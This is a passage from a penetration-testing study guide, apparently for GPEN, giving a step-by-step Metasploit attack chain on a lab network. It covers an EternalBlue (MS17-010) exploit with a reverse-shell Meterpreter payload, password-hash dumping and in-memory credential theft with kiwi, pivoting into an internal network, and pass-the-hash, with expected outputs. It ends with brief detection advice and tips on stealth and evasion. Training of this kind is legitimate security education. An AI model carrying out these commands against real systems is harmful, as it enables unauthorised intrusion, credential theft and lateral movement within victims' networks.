**Note:** A `manual` rank can mean one of two things: either the exploit is very close to DoS (high crash risk), or it does nothing without manual configuration by the user. In live/production testing, prefer `excellent`/`great`; set a safety band with `MinimumRank`; this is part of the "safe pentest" principle.

## 7.11 A step-by-step worked example: nmap → DB → exploit → Meterpreter → pivot

Scenario: a Windows host (vulnerable to MS17-010) whose external leg is `10.10.10.10`. This host's second NIC faces the `10.10.20.0/24` internal network; `10.10.20.5` in the internal network is a file server. Goal: compromise the external host, pivot into the internal network, scan the internal server.

**1) Database and workspace preparation**

```
# shell'de:
msfdb init
msfconsole -q
```

```
# konsolda:
db_status
workspace -a gpen_lab
```

Expected: `[*] Connected to msf. Connection type: postgresql.` and `[*] Added workspace: gpen_lab`.

**2) Get the scan into the DB**

```
db_nmap -sV -p 445,139,3389 10.10.10.10
hosts
services
```

Expected (summary):

```
Services
========
host         port  proto  name          state  info
----         ----  -----  ----          -----  ----
10.10.10.10  445   tcp    microsoft-ds  open   Windows Server 2008 R2
```

**3) Verify the vulnerability (auxiliary scanner, for an exploit without check)**

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.10
run
```

Expected:

```
[+] 10.10.10.10:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2
```

**4) Select, configure, and exploit**

```
use exploit/windows/smb/ms17_010_eternalblue
info                                 # rank: average, CVE-2017-0144 teyit
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
show options                         # are the Required=yes ones filled in
exploit -j -z
```

Expected:

```
[*] Started reverse TCP handler on 10.10.14.5:443
[+] 10.10.10.10:445 - The target is vulnerable.
[*] Meterpreter session 1 opened (10.10.14.5:443 -> 10.10.10.10:49158)
```

**5) Enter the session, gather privilege and credentials**

```
sessions -l
sessions -i 1
```

```
getuid                 # => NT AUTHORITY\SYSTEM (EternalBlue zaten SYSTEM verir)
sysinfo                # OS/mimari/domain
ps -S lsass            # lsass PID'i (x64)
hashdump               # SAM local hashes → written to loot
load kiwi
creds_all              # bellekteki kimlikler
background             # background the session
```

Expected `hashdump` (example):

```
Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**6) Discover the internal network and set up the pivot**

```
sessions -i 1
ipconfig               # => second NIC: 10.10.20.11/24 (internal network!)
run autoroute -s 10.10.20.0/24
background
```

```
# SOCKS proxy (for external tools)
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
```

At the end of `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`

**7) Scan the internal network (from within MSF and with proxychains)**

```
# with an MSF module (via autoroute):
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.20.5
set PORTS 445,3389
run
```

Expected: `[+] 10.10.20.5: - 10.10.20.5:445 - TCP OPEN`

```
# with external nmap (proxychains + socks5):
proxychains nmap -sT -Pn -p 445,3389 10.10.20.5
```

**8) Single-port access to the internal target (portfwd) or pass-the-hash**

```
# From the external host's session, bind the internal RDP to local:
sessions -i 1
portfwd add -l 3389 -p 3389 -r 10.10.20.5
# yerelden:
proxychains crackmapexec smb 10.10.20.5 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

This chain is the expected full flow: **recon (into the DB) → verification (auxiliary) → exploitation (exploit + payload) → post-exploitation (Meterpreter + kiwi/hashdump) → pivoting (autoroute + socks + portfwd)**.

**Detection/Defense (across the chain):** (1) MS17-010 → SMBv1 trans packets are an IDS signature; defense: remove SMBv1, apply the MS17-010 patch. (2) SYSTEM shell + outbound connection on 443 → Sysmon 1/3. (3) LSASS access (kiwi) → Sysmon 10. (4) Pivoting → abnormal east-west scanning/multi-target 445 connections in the internal network → block with NetFlow anomaly detection + segmentation. (5) PtH → Logon Type 3 + NTLM, the same hash used on many hosts → reduce the value with LAPS + Credential Guard.

---

**Common mistakes (summary):**

- `check` only exists in some exploits; if it doesn't, verify with an **auxiliary scanner**.
- `exploit -j` backgrounds the handler (multiple sessions), `exploit -z` backgrounds the session as soon as it opens; `set ExitOnSession false` + `-j -z` gives a persistent multi-handler.
- `migrate` is for stability and stealth; move from the short-lived exploit process to a long-lived one (`explorer.exe`), but the architecture (x86/x64) must match.
- Pivoting: **autoroute** for MSF modules, **socks_proxy + proxychains** for external tools (match the version and port; `nmap -sT -Pn`), **portfwd** for a single service.
- Give an interface name like `LHOST tun0` → MSF picks the correct VPN IP; manually writing the wrong IP is the most common "session isn't coming in" mistake.
- `hashdump`/`load kiwi` require **SYSTEM** and, most of the time, **x64** Meterpreter; as a standard user, run `getsystem` or `local_exploit_suggester` first.
- Encoder is not AV evasion; `shikata_ga_nai` diversifies the signature but doesn't get past modern AV/EDR.
- `clearev` deletes the logs, but the deletion itself is logged as **Event ID 1102/104**; it's not stealth, it produces an IOC.
- `set` is valid in that module, `setg` is valid for the whole session; use `services -p <port> -R` to assign hosts directly to RHOSTS.
